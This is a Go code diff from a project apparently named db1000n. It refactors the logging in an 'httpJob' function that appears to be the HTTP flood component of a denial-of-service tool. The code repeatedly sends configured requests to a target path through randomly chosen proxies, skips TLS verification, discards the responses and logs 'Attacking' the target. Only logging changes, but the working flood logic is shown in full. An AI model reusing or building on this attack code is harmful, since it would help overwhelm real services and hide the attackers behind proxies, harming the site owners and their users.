@@ -5,7 +5,8 @@ import (
 	"context"
 	"crypto/tls"
 	"encoding/json"
-	"fmt"
+	"errors"
+	"log"
 	"math/rand"
 	"net"
 	"net/http"
@@ -15,14 +16,28 @@ import (
 	"github.com/corpix/uarand"
 	"github.com/google/uuid"
 
-	"github.com/Arriven/db1000n/src/logs"
 	"github.com/Arriven/db1000n/src/metrics"
 	"github.com/Arriven/db1000n/src/utils"
 	"github.com/Arriven/db1000n/src/utils/templates"
 )
 
-func httpJob(ctx context.Context, l *logs.Logger, args Args) error {
+func httpJob(ctx context.Context, args Args, debug bool) error {
 	defer utils.PanicHandler()
+
+	type httpJobConfig struct {
+		BasicJobConfig
+		Path    string
+		Method  string
+		Body    json.RawMessage
+		Headers map[string]string
+		Client  json.RawMessage // See HTTPClientConfig
+	}
+
+	var jobConfig httpJobConfig
+	if err := json.Unmarshal(args, &jobConfig); err != nil {
+		log.Printf("Error parsing job config json: %v", err)
+		return err
+	}
 
 	type HTTPClientConfig struct {
 		TLSClientConfig *tls.Config    `json:"tls_config,omitempty"`
@@ -31,24 +46,10 @@ func httpJob(ctx context.Context, l *logs.Logger, args Args) error {
 		ProxyURLs       string         `json:"proxy_urls"`
 		Async           bool           `json:"async"`
 	}
-	type httpJobConfig struct {
-		BasicJobConfig
-		Path    string
-		Method  string
-		Body    json.RawMessage
-		Headers map[string]string
-		Client  json.RawMessage
-	}
-
-	var jobConfig httpJobConfig
-	if err := json.Unmarshal(args, &jobConfig); err != nil {
-		l.Error("error parsing json: %v", err)
-		return err
-	}
 
 	var clientConfig HTTPClientConfig
-	if err := json.Unmarshal([]byte(templates.Execute(string(jobConfig.Client))), &clientConfig); err != nil {
-		l.Debug("error parsing json: %v", err)
+	if err := json.Unmarshal([]byte(templates.Execute(string(jobConfig.Client))), &clientConfig); err != nil && debug {
+		log.Printf("Failed to parse job client json: %v", err)
 	}
 
 	timeout := time.Second * 90
@@ -64,35 +65,43 @@ func httpJob(ctx context.Context, l *logs.Logger, args Args) error {
 	tlsConfig := &tls.Config{
 		InsecureSkipVerify: true,
 	}
+
 	if clientConfig.TLSClientConfig != nil {
 		tlsConfig = clientConfig.TLSClientConfig
 	}
 
 	var proxy func(r *http.Request) (*url.URL, error)
 	if len(clientConfig.ProxyURLs) > 0 {
-		l.Debug("clientConfig.ProxyURLs: %v", clientConfig.ProxyURLs)
+		log.Printf("clientConfig.ProxyURLs: %v", clientConfig.ProxyURLs)
+
 		var proxyURLs []string
-		err := json.Unmarshal([]byte(clientConfig.ProxyURLs), &proxyURLs)
-		if err == nil {
-			l.Debug("proxyURLs: %v", proxyURLs)
+
+		if err := json.Unmarshal([]byte(clientConfig.ProxyURLs), &proxyURLs); err == nil {
+			if debug {
+				log.Printf("proxyURLs: %v", proxyURLs)
+			}
+
 			// Return random proxy from the list
 			proxy = func(r *http.Request) (*url.URL, error) {
 				if len(proxyURLs) == 0 {
-					return nil, fmt.Errorf("proxylist is empty")
+					return nil, errors.New("proxylist is empty")
 				}
-				proxyID := rand.Intn(len(proxyURLs))
-				proxyString := proxyURLs[proxyID]
+
+				proxyString := proxyURLs[rand.Intn(len(proxyURLs))]
+
 				u, err := url.Parse(proxyString)
 				if err != nil {
-					u, err = url.Parse(r.URL.Scheme + proxyString)
-					if err != nil {
-						l.Warning("failed to parse proxy: %v\nsending request directly", err)
+					if u, err = url.Parse(r.URL.Scheme + proxyString); err != nil && debug {
+						log.Printf("Failed to parse proxy, sending request directly: %v", err)
 					}
 				}
+
 				return u, nil
 			}
 		} else {
-			l.Debug("failed to parse proxies: %v", err) // It will still send traffic as if no proxies were specified, no need for warning
+			if debug {
+				log.Printf("Failed to parse proxies: %v", err) // It will still send traffic as if no proxies were specified, no need for warning
+			}
 		}
 	}
 
@@ -111,6 +120,7 @@ func httpJob(ctx context.Context, l *logs.Logger, args Args) error {
 		},
 		Timeout: timeout,
 	}
+
 	trafficMonitor := metrics.Default.NewWriter(ctx, "traffic", uuid.New().String())
 	ticker := time.NewTicker(time.Second)
 	defer ticker.Stop()
@@ -119,13 +129,16 @@ func httpJob(ctx context.Context, l *logs.Logger, args Args) error {
 		req, err := http.NewRequest(templates.Execute(jobConfig.Method), templates.Execute(jobConfig.Path),
 			bytes.NewReader([]byte(templates.Execute(string(jobConfig.Body)))))
 		if err != nil {
-			l.Debug("error creating request: %v", err)
+			if debug {
+				log.Printf("error creating request: %v", err)
+			}
+
 			continue
 		}
 
 		select {
 		case <-ticker.C:
-			l.Info("Attacking %v", jobConfig.Path)
+			log.Printf("Attacking %v", jobConfig.Path)
 		default:
 		}
 
@@ -136,26 +149,33 @@ func httpJob(ctx context.Context, l *logs.Logger, args Args) error {
 			trafficMonitor.Add(len(value))
 			req.Header.Add(templates.Execute(key), templates.Execute(value))
 		}
+
 		trafficMonitor.Add(len(jobConfig.Method))
 		trafficMonitor.Add(len(jobConfig.Path))
 		trafficMonitor.Add(len(jobConfig.Body))
 
-		startedAt := time.Now().Unix()
-		l.Debug("%s %s started at %d", jobConfig.Method, jobConfig.Path, startedAt)
+		if debug {
+			log.Printf("%s %s started at %d", jobConfig.Method, jobConfig.Path, time.Now().Unix())
+		}
 
 		sendRequest := func() {
 			resp, err := client.Do(req)
 			if err != nil {
-				l.Debug("error sending request %v: %v", req, err)
+				if debug {
+					log.Printf("Error sending request %v: %v", req, err)
+				}
+
 				return
 			}
 
-			finishedAt := time.Now().Unix()
 			resp.Body.Close() // No need for response
-			if resp.StatusCode >= 400 {
-				l.Debug("%s %s failed at %d with code %d", jobConfig.Method, jobConfig.Path, finishedAt, resp.StatusCode)
-			} else {
-				l.Debug("%s %s finished at %d", jobConfig.Method, jobConfig.Path, finishedAt)
+
+			if debug {
+				if resp.StatusCode >= http.StatusBadRequest {
+					log.Printf("%s %s failed at %d with code %d", jobConfig.Method, jobConfig.Path, time.Now().Unix(), resp.StatusCode)
+				} else {
+					log.Printf("%s %s finished at %d", jobConfig.Method, jobConfig.Path, time.Now().Unix())
+				}
 			}
 		}
 
